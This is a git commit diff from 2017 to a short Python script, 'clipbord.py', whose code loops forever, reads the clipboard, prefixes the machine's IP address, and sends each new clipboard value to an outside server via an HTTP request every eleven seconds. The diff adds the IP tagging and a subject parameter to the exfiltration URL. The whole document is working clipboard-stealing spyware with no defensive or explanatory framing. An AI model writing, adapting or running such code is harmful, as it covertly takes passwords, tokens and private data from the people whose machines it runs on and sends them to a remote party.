5453ec7e39f16d407788209521ec2bfa2cb87fe3
JL <jeanlouis02300@gmail.com>
2017-03-12 20:04:26 +0100

    maj

--- clipboard/clipbord.py
+++ clipboard/clipbord.py
@@ -1,10 +1,11 @@
-import urllib, os, sys, requests, pyperclip, time
+import urllib, os, sys, requests, pyperclip, time, socket
 clist = ['None']
-
+adresse = socket.gethostbyname(socket.gethostname());
 while True:
     clip = pyperclip.paste()
     msg = clip.encode('utf-8')
+    msg = adresse + " : " + msg
     if msg not in clist:
         clist.append(msg)
-        urllib.urlopen("https://frompixel.com/recept/recept.php?a=" + msg)
+        urllib.urlopen("https://frompixel.com/recept/recept.php?a=" + msg + "&sujet=clipbord")
     time.sleep(11)
